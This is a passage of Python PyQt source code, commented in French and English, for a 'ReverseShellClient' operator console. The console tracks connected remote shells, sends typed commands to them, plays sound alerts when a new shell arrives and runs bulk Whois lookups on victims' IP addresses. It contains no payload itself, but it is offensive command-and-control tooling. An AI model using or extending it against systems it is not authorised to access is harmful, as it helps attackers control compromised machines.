                output_parts.append(f"ASN Date: {results.get('asn_date', 'N/A')}\n")
                output_parts.append(f"ASN Description: {results.get('asn_description', 'N/A')}\n")

                # Afficher les entrées Whois brutes
                nets = results.get('nets', [])
                if nets:
                    output_parts.append("--- Network Information ---\n")
                    for i, net in enumerate(nets):
                        output_parts.append(f"Network {i+1}:\n")
                        for key, value in net.items():
                            # Gérer les valeurs potentiellement longues ou None
                            if isinstance(value, list):
                                value_str = ', '.join(str(v) for v in value)
                            else:
                                value_str = str(value) if value is not None else 'N/A'
                            output_parts.append(f"  {key}: {value_str}\n")
                        output_parts.append("\n")
                else:
                     output_parts.append("No network information found.\n")

                # Afficher les données brutes si disponibles
                raw_data = results.get('raw', None)
                if raw_data:
                    output_parts.append("--- Raw Whois Data ---\n")
                    output_parts.append(raw_data)

                output = "".join(output_parts)

            except Exception as e:
                output = f"An error occurred during whois lookup: {str(e)}"

        # Afficher le résultat dans une nouvelle fenêtre
        dialog = WhoisDisplayWindow(ip_address, output, self)
        dialog.exec()

    # --- Ajout : Méthode pour effectuer le Whois en masse ---
    def perform_bulk_whois(self):
        """Effectue un Whois pour toutes les IPs actives et affiche les résultats dans une fenêtre."""
        if not self.shells:
            self.log_message("No active shells to perform Whois on.")
            return

        if not IPWHOIS_AVAILABLE:
            self.log_message("Error: 'ipwhois' library not found. Please install it (e.g., 'pip install ipwhois').")
            return

        # Extraire les IPs uniques
        unique_ips = list(set(shell_id.split(':')[0] for shell_id in self.shells.keys()))
        
        if not unique_ips:
            self.log_message("No unique IPs found.")
            return
            
        self.log_message(f"Starting bulk Whois lookup for {len(unique_ips)} unique IPs...")
        
        # Créer et afficher la fenêtre de résultats
        self.bulk_whois_window = BulkWhoisDisplayWindow(self)
        self.bulk_whois_window.show()
        
        # Démarrer le traitement en arrière-plan
        self.bulk_whois_thread = BulkWhoisThread(unique_ips)
        self.bulk_whois_thread.result_ready.connect(self.bulk_whois_window.add_result)
        self.bulk_whois_thread.finished.connect(lambda: self.log_message("Bulk Whois lookup completed."))
        self.bulk_whois_thread.start()
    # --- Fin de l'ajout ---
    def send_custom_command(self, shell_id):
        """Send a custom command to a specific shell"""
        command, ok = QInputDialog.getText(self, "Send Command", "Enter command:")
        if ok and command:
            self.send_command(shell_id, command)
    def update_shell_output(self, data):
        """Update shell output with proper ANSI cleaning"""
        shell_id = data['shell_id']
        if shell_id in self.shells:
            terminal = self.shells[shell_id]['terminal']
            terminal.append_output(data['output'])
    def remove_shell_from_list(self, data):
        """Remove shell from list on disconnection"""
        shell_id = data['shell_id']
        if shell_id in self.shells:
            # Get references
            shell_data = self.shells[shell_id]
            item = shell_data['widget']
            terminal = shell_data['terminal']
            terminal_index = shell_data['terminal_index']
            # Remove from list widget
            row = self.shell_list_widget.row(item)
            self.shell_list_widget.takeItem(row)
            # Remove terminal from stack
            self.terminals_stack.removeWidget(terminal)
            terminal.deleteLater()
            # Remove from tracking
            del self.shells[shell_id]
            # Update dashboard
            self.shells_count_label.setText(
                f"Active Shells: {len(self.shells)}")
            self.log_message(f"Shell disconnected: {shell_id}")
            self.signals.alert.emit(
                "disconnection", f"Shell disconnected: {shell_id}")
            # If this was the currently displayed terminal, switch to default
            if self.terminals_stack.count() == 1:  # Only default terminal left
                self.terminals_stack.setCurrentWidget(self.default_terminal)
    def update_connection_status(self, connected):
        """Update connection status"""
        if not connected:
            # --- Remplacement de la mise à jour directe du style par l'appel à la méthode animée ---
            self.update_status_label("Disconnected", False)
            # --- Fin du remplacement ---
            self.disconnect_from_server()
            self.start_auto_reconnect()
    # --- Ajout : Animation du panneau latéral ---
    def toggle_sidebar(self, checked):
        """Toggle visibility of the left sidebar with animation"""
        if self.sidebar_animation and self.sidebar_animation.state() == QAbstractAnimation.State.Running:
            self.sidebar_animation.stop() # Arrêter l'animation en cours
        sidebar = self.main_splitter.widget(0) # left_panel
        start_width = sidebar.width()
        if checked:
            # Cacher
            end_width = 0
            self.toggle_sidebar_btn.setText("Show Sidebar")
        else:
            # Montrer
            # Utiliser la largeur sauvegardée ou une valeur par défaut
            end_width = getattr(self, '_sidebar_default_width', 300)
            if not hasattr(self, '_sidebar_default_width'):
                 self._sidebar_default_width = sidebar.sizeHint().width() # Ou une valeur fixe
            self.toggle_sidebar_btn.setText("Hide Sidebar")
        self.sidebar_animation = QPropertyAnimation(sidebar, b"minimumWidth")
        self.sidebar_animation.setDuration(300) # Durée en ms
        self.sidebar_animation.setStartValue(start_width)
        self.sidebar_animation.setEndValue(end_width)
        self.sidebar_animation.setEasingCurve(QEasingCurve.Type.InOutQuad) # Courbe d'animation douce
        self.sidebar_animation.start()
        # Connecter la fin de l'animation pour vraiment cacher/montrer si nécessaire
        # (Souvent pas nécessaire avec minimum/maximum width)
    # --- Fin de l'ajout ---
    def show_alert(self, alert_type, message):
        """Show alert message"""
        timestamp = time.strftime("%H:%M:%S")
        alert_text = f"[{timestamp}] ALERT {alert_type.upper()}: {message}"
        self.log_area.append(alert_text)
        # Flash window taskbar for important alerts - MODIFICATION: Supprimé pour éviter le focus automatique
        # if alert_type in ["new_shell", "disconnection"]:
        #     self.activateWindow()  # LIGNE SUPPRIMÉE
    # --- Méthodes pour la fonctionnalité MP3 (Ajoutées) ---
    def browse_mp3_file(self):
        """Open file dialog to select an MP3 file."""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select MP3 File", "", "MP3 Files (*.mp3)")
        if file_path:
            self.mp3_file_input.setText(file_path)
    def play_mp3_alert(self):
        """Play the selected MP3 file if enabled and pygame is available."""
        if not PYGAME_AVAILABLE:
            self.log_message("MP3 Alert: pygame not available.")
            return
        if not self.mp3_alert_checkbox.isChecked():
            return  # Fonctionnalité désactivée
        mp3_path = self.mp3_file_input.text().strip()
        if not mp3_path:
            self.log_message("MP3 Alert: No file selected.")
            return
        try:
            # Initialiser le mixer s'il ne l'est pas déjà
            if not mixer.get_init():
                # Initialiser avec des paramètres par défaut, ajustez si nécessaire
                mixer.init()
            # Charger et jouer le fichier
            # Utiliser un canal spécifique ou le canal par défaut
            mixer.music.load(mp3_path)
            mixer.music.play()
            # Optionnel : Attendre la fin de la lecture (bloquant) - pas recommandé dans le thread principal
            # while mixer.music.get_busy():
            #     time.sleep(0.1)
            # Ou simplement lancer la lecture et continuer
            self.log_message(f"MP3 Alert triggered: {mp3_path}")
        except Exception as e:
            self.log_message(f"MP3 Alert Error: {e}")
    # --- Fin des méthodes ajoutées ---
    def log_message(self, message):
        """Add message to log"""
        timestamp = time.strftime("%H:%M:%S")
        self.log_area.append(f"[{timestamp}] {message}")
        self.log_area.moveCursor(QTextCursor.MoveOperation.End)
        self.statusBar().showMessage(message)

# --- Thread pour le Whois en masse ---
class BulkWhoisThread(QThread):
    result_ready = pyqtSignal(str, str, str, str, str, str)  # Signal pour envoyer un résultat (ip, country, country_code, asn_cidr, description, registry)
    
    def __init__(self, ip_list):
        super().__init__()
        self.ip_list = ip_list
        
    def run(self):
        """Exécute les requêtes Whois dans un thread séparé."""
        for ip in self.ip_list:
            try:
                if not IPWHOIS_AVAILABLE:
                    # Émettre un signal avec des valeurs par défaut en cas d'erreur
                    self.result_ready.emit(ip, "Error", "N/A", "N/A", "ipwhois library not available", "N/A")
                    continue
                    
                obj = IPWhois(ip)
                results = obj.lookup_whois()
                
                # Extraire les champs souhaités
                query = results.get('query', 'N/A')
                asn_country = results.get('asn_country_code', 'N/A')
                asn_cidr = results.get('asn_cidr', 'N/A')
                asn_registry = results.get('asn_registry', 'N/A')
                
                # Trouver la première description non vide dans nets
                asn_description = 'N/A'
                nets = results.get('nets', [])
                if nets:
                    for net in nets:
                        desc = net.get('description', None)
                        if desc:
                            asn_description = desc
                            break
                
                # Émettre le signal avec les résultats
                self.result_ready.emit(query, asn_country, asn_country, asn_cidr, asn_description, asn_registry)
                
            except Exception as e:
                # Émettre un signal avec des valeurs par défaut en cas d'exception
                self.result_ready.emit(ip, "Error", "N/A", "N/A", str(e), "N/A")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    # Parse command line arguments
    server_host = "127.0.0.1"
    server_port = 5555
    if len(sys.argv) > 1:
        server_host = sys.argv[1]
    if len(sys.argv) > 2:
        server_port = int(sys.argv[2])
    window = ReverseShellClient(server_host, server_port)
    window.show()
    sys.exit(app.exec())